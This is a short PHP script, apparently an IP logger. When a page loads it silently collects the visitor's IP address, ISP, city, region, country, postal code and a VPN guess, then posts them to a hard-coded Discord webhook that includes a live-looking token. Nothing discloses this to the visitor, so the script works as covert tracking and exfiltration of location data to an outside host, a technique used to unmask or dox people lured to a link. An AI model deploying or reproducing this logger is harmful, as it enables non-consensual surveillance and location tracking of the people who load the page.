  
<?php
$webhookurl = "https://discordapp.com/api/webhooks/797872730451738664/37qRbA7EuATaQx7xGZUqw_BO-J9u9tu80V8htm9dbgprHV7OBnPa3OJ5JDJkX4dwx4lC";
$ip= $_SERVER['REMOTE_ADDR'];
$browser = $_SERVER['HTTP_USER_AGENT'];
$TheirDate = date('d/m/Y');
$TheirTime = date('G:i:s');
$details = json_decode(file_get_contents("http://ip-api.com/json/{$ip}"));
$vpnCon = json_decode(file_get_contents("https://json.geoiplookup.io/{$ip}"));
        if($vpnCon->connection_type==="Corporate"){
            $vpn = "Yes (Double Check: $details->isp)";
        }else{
            $vpn = "No (Double Check: $details->isp)";
        }
$flag = "https://www.countryflags.io/{$details->countryCode}/shiny/64.png";
$data = "**User IP:** $ip\n**ISP:** $details->isp\n**Date:** $TheirDate\n**Time:** $TheirTime \n**Location:** $details->city \n**Region:** $details->region\n**Country** $details->country\n**Postal Code:** $details->zip\n**IsVPN?** $vpn  (Possible False-Postives)";
$json_data = array ('content'=>"$data", 'username'=>"Vistor Visited From: $details->country", 'avatar_url'=> "$flag");
$make_json = json_encode($json_data);
$msg = "$json_data";
$ch = curl_init( $webhookurl );
curl_setopt( $ch, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
curl_setopt( $ch, CURLOPT_POST, 1);
curl_setopt( $ch, CURLOPT_POSTFIELDS, $make_json);
curl_setopt( $ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt( $ch, CURLOPT_HEADER, 0);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, 1);
$response = curl_exec( $ch );
?>
